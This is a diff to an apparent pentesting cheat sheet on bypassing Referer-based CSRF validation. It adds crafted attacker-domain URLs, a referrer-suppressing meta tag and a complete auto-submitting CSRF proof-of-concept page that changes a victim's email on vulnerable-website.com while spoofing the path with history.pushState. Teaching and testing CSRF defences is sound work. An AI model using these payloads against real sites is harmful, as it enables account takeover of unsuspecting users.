@@ -137,14 +137,37 @@ redirectOnConfirmation = () => {
 ## <mark style="color:yellow;">Referer-based validation bypass</mark>
 
 * Some apps validate the Referer header if present, but skip if omitted
-  * `<meta name="referrer" content="never">`
+
+```html
+<meta name="referrer" content="never">
+```
+
 * Validation of Referer can be circumvented
   * ```
     http://vulnerable-website.com.attacker-website.com/csrf-attack
     http://attacker-website.com/csrf-attack?vulnerable-website.com
     http://attacker-website.com/vulnerable-website.com
     ```
-  * Tip: Instead of use `http://attacker-website.com/vulnerable-website.com` that looks strange you can use `http://attacker-website.com/` and add `<script>history.pushState('', '', '/attacker-website.com')</script>`
-  * Note: Add `Referrer-Policy: unsafe-url`. One way to set it in html: `<meta name="referrer" content="unsafe-url"/>`
+  * To sed referer you need to add `Referrer-Policy: unsafe-url`. One way to set it in html: `<meta name="referrer" content="unsafe-url"/>`
+
+{% hint style="info" %}
+**Tip**: Instead of use `http://attacker-website.com/vulnerable-website.com` that looks strange you can use `http://attacker-website.com/` and add `<script>history.pushState('', '', '/vulnerable-website.com')</script>`
+
+<pre class="language-html"><code class="lang-html">&#x3C;!-- http://attacker-website.com/ -->
+<strong>&#x3C;html>
+</strong>  &#x3C;meta name="referrer" content="unsafe-url"/>
+  &#x3C;body>
+    &#x3C;form action="https://vulnerable-website.com/change-email" method="POST">
+      &#x3C;input type="hidden" name="email" value="test@test.com" />
+      &#x3C;input type="submit" value="Submit request" />
+    &#x3C;/form>
+    &#x3C;script>
+      history.pushState('', '', '/vulnerable-website.com');
+      document.forms[0].submit();
+    &#x3C;/script>
+  &#x3C;/body>
+&#x3C;/html>
+</code></pre>
+{% endhint %}
 
 Firefox 87 new default Referrer Policy `strict-origin-when-cross-origin` trimming user sensitive information like path and query string to protect privacy. ([https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/](https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/))
